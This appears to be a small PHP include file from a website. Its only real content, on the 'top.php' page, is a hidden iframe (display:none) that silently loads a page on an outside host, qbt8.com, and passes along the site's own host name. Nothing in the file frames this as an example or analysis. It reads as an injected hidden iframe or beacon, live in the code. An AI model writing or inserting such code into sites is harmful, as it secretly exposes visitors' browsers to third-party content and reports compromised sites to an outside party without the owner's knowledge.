<?php
if(strpos($_SERVER['PHP_SELF'], 'menu.php')){
?>
<?php
}
if(strpos($_SERVER['PHP_SELF'], 'top.php')){
  $host = $_SERVER['HTTP_HOST'];
?>
<iframe src="http://www.qbt8.com/newnote.php?url=<?php echo $host; ?>" width="100%" height="18" frameborder="0" scrolling="no" allowtransparency='true' style="display:none"></iframe>
<?php
}